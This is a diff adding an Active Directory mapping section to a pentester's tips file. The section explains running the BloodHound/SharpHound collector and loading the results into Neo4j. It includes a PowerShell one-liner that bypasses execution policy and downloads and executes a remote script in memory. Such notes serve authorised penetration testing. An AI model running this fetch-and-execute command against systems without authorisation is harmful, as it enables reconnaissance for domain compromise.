@@ -4,6 +4,24 @@ Some tips from a cybersecurity consultant in France.
 
 ## Pentest Active Directory
 
+### AD Mapping
+
+Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
+
+```markdown
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1’);Invoke-BloodHound"
+```
+
+The tool give you a zip file, that you have to send to a Neo4j database. Start the Neo4j database :
+
+```markdown
+Import-Module .\Neo4j-Management.psd1
+Invoke-Neo4j console
+```
+
+Then execute BloodHound.exe and import the zip file.
+
+
 ### Shares :
 
 Dump all shares via CrackMapExec :
